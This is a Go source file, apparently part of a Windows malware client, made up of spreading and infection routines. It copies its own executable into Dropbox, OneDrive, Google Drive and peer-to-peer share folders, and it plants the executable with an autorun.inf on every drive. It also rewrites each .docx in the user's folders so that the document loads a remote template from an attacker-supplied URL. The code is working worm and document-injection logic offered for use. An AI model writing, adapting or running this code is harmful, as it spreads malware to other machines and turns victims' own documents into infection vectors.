package core

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
)

func CloudServiceSpread(file string) {
	if _, err := os.Stat(os.Getenv("USERPROFILE") + "\\Dropbox\\Public"); !os.IsNotExist(err) {
		_ = CopyFileToDirectory(os.Args[0], os.Getenv("USERPROFILE")+"\\Dropbox\\Public\\"+file)
	}
	if _, err := os.Stat(os.Getenv("USERPROFILE") + "\\OneDrive\\Public"); !os.IsNotExist(err) {
		_ = CopyFileToDirectory(os.Args[0], os.Getenv("USERPROFILE")+"\\OneDrive\\Public\\"+file)
	}
	if _, err := os.Stat(os.Getenv("USERPROFILE") + "\\Google Drive"); !os.IsNotExist(err) {
		_ = CopyFileToDirectory(os.Args[0], os.Getenv("USERPROFILE")+"\\Google Drive\\"+file)
	}
}

func FileShareSpread(file string) { // No way this will work, but why not add the code.
	if _, err := os.Stat(os.Getenv("UserProfile") + "\\Downloads\\eMule\\Incoming"); !os.IsNotExist(err) { //eMule LUL
		_ = CopyFileToDirectory(os.Args[0], os.Getenv("UserProfile")+"\\Downloads\\eMule\\Incoming\\"+file)
	}
	if _, err := os.Stat(os.Getenv("ProgramFiles") + "\\icq\\shared folder"); !os.IsNotExist(err) { //IQC LUL
		_ = CopyFileToDirectory(os.Args[0], os.Getenv("ProgramFiles")+"\\icq\\shared folder\\"+file)
	}
	if _, err := os.Stat(os.Getenv("ProgramFiles") + "\\edonkey2000\\incoming"); !os.IsNotExist(err) { //eDonkey2000 LUL
		_ = CopyFileToDirectory(os.Args[0], os.Getenv("ProgramFiles")+"\\edonkey2000\\incoming\\"+file)
	}
}

func DriveInfect() { //Will hardly ever work anymore, But might be able to SE someone into running the client
	for i := 0; i < len(DriveNames); i++ {
		if CheckIfFileExists(DriveNames[i] + ":\\") {
			filename := SpreadFileNames[rand.Intn(len(SpreadFileNames))] + ".exe"
			_ = CopyFileToDirectory(os.Args[0], DriveNames[i]+":\\"+filename)
			_ = CreateFileAndWriteData(DriveNames[i]+":\\autorun.inf", []byte("[AutoRun] action="+filename))
		}
	}
}

func DocxInjector(directories []string, templateUrl string) bool {
	for _, directory := range directories {
		path := os.Getenv("USERPROFILE") + "\\" + directory
		err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				fmt.Println(err)
			}
			if filepath.Ext(path) == ".docx" {
				injectDocxTemplate(path, templateUrl)
			}
			return nil
		})
		if err != nil {
			return false
		}
	}
	return true
}

func injectDocxTemplate(documentPath string, templateUrl string) bool {
	dstDir := os.Getenv("USERPROFILE") + "\\Temp"
	_ = os.Mkdir(dstDir, 0755)
	os.Chdir(dstDir)
	_, _ = os.Getwd()
	newDocumentName := dstDir + "\\target.zip"
	err := os.Rename(documentPath, newDocumentName)
	if err != nil {
		return false
	}
	_, err = exec.Command("powershell.exe", "Expand-Archive", "-LiteralPath", "target.zip", "-DestinationPath", ".").Output()
	os.Remove("target.zip")
	if err != nil {
		return false
	}
	winContentTypeXmlInject := bytes.Replace([]byte(contentTypeXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("[Content_Types].xml", winContentTypeXmlInject, 0777)
	if err != nil {
		return false
	}
	err = os.Chdir("word")
	if err != nil {
		return false
	}
	winSettingsXmlInject := bytes.Replace([]byte(settingsXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("settings.xml", winSettingsXmlInject, 0777)
	if err != nil {
		return false
	}
	winFootnotesXmlInject := bytes.Replace([]byte(footnotesXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("footnotes.xml", winFootnotesXmlInject, 0777)
	if err != nil {
		return false
	}
	winEndnotesXmlInject := bytes.Replace([]byte(endnotesXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("endnotes.xml", winEndnotesXmlInject, 0777)
	if err != nil {
		return false
	}
	err = os.Chdir("_rels")
	if err != nil {
		return false
	}
	_, _ = os.Getwd()
	injectEntry := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="` + templateUrl + `" TargetMode="External"/></Relationships>`
	winInjectEntry := bytes.Replace([]byte(injectEntry), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("settings.xml.rels", winInjectEntry, 0777)
	if err != nil {
		return false
	}
	winDocumentXmlInject := bytes.Replace([]byte(documentXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("document.xml.rels", winDocumentXmlInject, 0777)
	if err != nil {
		return false
	}
	err = os.Chdir("..\\..\\docProps")
	if err != nil {
		return false
	}
	winAppXmlInject := bytes.Replace([]byte(appXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("app.xml", winAppXmlInject, 0777)
	if err != nil {
		return false
	}
	os.Chdir("..\\")
	_, _ = os.Getwd()
	_, err = exec.Command("powershell.exe", "Compress-Archive", "*", "-DestinationPath", "injected.zip").Output()
	err = os.Rename("injected.zip", documentPath)
	if err != nil {
		return false
	}
	os.Chdir("..\\")
	err = os.RemoveAll(dstDir)
	if err != nil {
		return false
	}
	return true
}
